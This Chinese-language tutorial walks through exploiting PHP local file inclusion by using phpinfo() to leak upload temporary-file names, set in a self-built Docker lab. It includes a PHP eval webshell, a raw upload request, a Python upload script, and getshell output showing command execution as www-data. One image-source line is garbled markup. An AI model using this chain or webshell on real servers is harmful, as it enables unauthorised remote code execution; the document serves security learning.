# PHP本地文件包含漏洞环境搭建与利用

0x00 简介
=======

* * *

php本地文件包含漏洞相关知识，乌云上早有相应的文章，lfi with phpinfo最早由国外大牛提出，可参考下面两篇文章。利用的原理是利用php post上传文件产生临时文件，phpinfo()读临时文件的路径和名字，本地包含漏洞生成1句话后门。

此方式在本地测试成功，为了方便大家学习，减小学习成本，已构建docker环境，轻松测试。将构建好的docker放在国外VPS上，使用github项目[lfi_phpinfo](https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo)中poc文件夹下的脚本，本地运行，依然可以getshell。说明这种方式是可行的，对网络要求不是很高。

*   Docker Hub 镜像地址:[janes/lfi_phpinfo](https://hub.docker.com/r/janes/lfi_phpinfo/)
    
*   github 项目地址:[lfi_phpinfo](https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo)
    

> 源码存放在 code目录下， 可使用docker再现，poc目录下存放利用脚本

paper:

[http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf](http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf)

[http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf](http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf)

0x01 php 上传
===========

* * *

向服务器上任意php文件**post请求上传文件**时，都会生成临时文件，可以直接在phpinfo页面找到临时文件的路径及名字。

*   post上传文件

php post方式上传任意文件，服务器都会创建临时文件来保存文件内容。

在HTTP协议中为了方便进行文件传输，规定了一种基于表单的[HTML文件传输方法](http://www.faqs.org/rfcs/rfc1867.html)

其中要确保上传表单的属性是 enctype=”multipart/form-data，必须用POST 参见:[php file-upload.post-method](http://www.faqs.org/rfcs/rfc1867.html)

其中PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：

1.  请求到达
2.  创建临时文件，并写入上传文件的内容
3.  调用相应PHP脚本进行处理，如校验名称、大小等
4.  删除临时文件

PHP引擎会首先将文件内容保存到临时文件，然后进行相应的操作。临时文件的名称是 php+随机字符 。

*   $_FILES信息，包括临时文件路径、名称

在PHP中，有超全局变量$_FILES,保存上传文件的信息，包括文件名、类型、临时文件名、错误代号、大小

0x02 手工测试phpinfo()获取临时文件路径
==========================

* * *

*   html表单

文件 upload.html

```
<!doctype html>
<html>
<body>
    <form action="phpinfo.php" method="POST" enctype="multipart/form-data">
    <h3> Test upload tmp file</h3>
    <label for="file">Filename:</label>
    <input type="file" name="file"/><br/>
    <input type="submit" name="submit" value="Submit" />
</form>
</body>
</html>

```

*   浏览器访问 upload.html, 上传文件 file.txt
    
    ```
    <?php
    eval($_REQUEST["cmd"]);
    ?>
    
    ```
*   burp 查看POST 信息如下
    
    ```
    POST /LFI_phpinfo/phpinfo.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://127.0.0.1/LFI_phpinfo/upload.html
    Connection: close
    Content-Type: multipart/form-data; boundary=---------------------------11008921013555437861019615112
    Content-Length: 368
    
    -----------------------------11008921013555437861019615112
    Content-Disposition: form-data; name="file"; filename="file.txt"
    Content-Type: text/plain
    
    <?php
    eval($_REQUEST["cmd"]);
    ?>
    
    -----------------------------11008921013555437861019615112
    Content-Disposition: form-data; name="submit"
    
    Submit
    -----------------------------11008921013555437861019615112--
    
    ```
*   浏览器访问，phpinfo 返回如下信息：
    
    ```
    _REQUEST["submit"]  
        Submit
    
    _POST["submit"] 
        Submit
    
    _FILES["file"]  
        Array
        (
            [name] => file.txt
            [type] => text/plain
            [tmp_name] => /tmp/phpufdCHh
            [error] => 0
            [size] => 33
        )
    
    ```

得到tmp_name 路径

0x03 python脚本 upload file
=========================

* * *

```
import requests

host = '127.0.0.1'
url = 'http://{ip}/LFI_phpinfo/phpinfo.php'.format(ip=host)
file_ = '/var/www/LFI_phpinfo/file.txt'

response = requests.post(url, files={"name": open(file_, 'rb')})

print(response.text)

```

*   部分返回结果
    
    ```
    <tr><td class="e">_FILES["name"]</td><td class="v"><pre>Array
    (
        [name] =&gt; file.txt
        [type] =&gt; 
        [tmp_name] =&gt; /tmp/php7EvBv3
        [error] =&gt; 0
        [size] =&gt; 33
    )
    
    ```

0x04 本地搭建环境
===========

* * *

*   get shell
    
    ```
    $ python lfi_phpinfo.py 127.0.0.1
    
    LFI with phpinfo()
    ==============================
    INFO:__main__:Getting initial offset ...
    INFO:__main__:found [tmp_name] at 67801
    INFO:__main__:
    Got it! Shell created in /tmp/g
    INFO:__main__:Wowo! \m/
    INFO:__main__:Shutting down...
    
    ```
*   firefox 访问
    
    ```
    http://127.0.0.1/LFI_phpinfo/lfi.php?load=/tmp/gc&f=id
    
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    
    ```

说明getshell成功，之后就可以自由发挥了～～

0x05 使用 docker 构建环境
===================

docker的基本用法，这里就不阐述了，可自行google。这里提供了两种构建镜像源的方式，使用github[lfi_phpinfo](https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo)中Dockerfile自行构建，或使用我已经构建好的镜像[janes/lfi_phpinfo](https://hub.docker.com/r/janes/lfi_phpinfo/)

*   镜像源

-- [php 1="官方源" 2="2="2="2="2="language=":5.6-apache"""""\"][/php][/php](http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf)[5](https://hub.docker.com/_/php/)

或

--[janes/lfi_phpinfo](https://hub.docker.com/r/janes/lfi_phpinfo/)

*   构建环境运行测试

获取 github[lfi_phpinfo](https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo)的源码，切换到web目录下，开始构建环境进行测试。这里提供三种方式运行

1.  方式1 使用php官方源运行测试
    
    ```
    docker run --rm -v code/:/var/www/html -p 80:80 php:5.6-apache
    
    ```
2.  方式2 使用构建好的镜像[janes/lfi_phpinfo](https://hub.docker.com/r/janes/lfi_phpinfo/)运行测试
    
    ```
    docker pull "janes/lfi_phpinfo"
    docker run --rm -p "80:80" janes/lfi_phpinfo
    
    ```
3.  方式3 使用docker-compose
    
    ```
    docker-compose up
    
    ```

接下来就可以使用python脚本 getshell 了

```
python lfi_phpinfo.py docker_host_ip

```

0x06 结束语
========

* * *

动手实践 LFI with PHPInfo利用的过程，其实并不像看文章过程那样顺利，期间多多少少会碰见一些与环境有关的问题，而解决这些问题会耗费精力，这正是催生我用docker来构建测试环境想法的来源，希望能给网络安全的热爱者们提供更方便的学习环境。最后感谢[LFI with PHPInfo本地测试过程]文章的作者，给我研究LFI with phpinfo提供了不少帮助。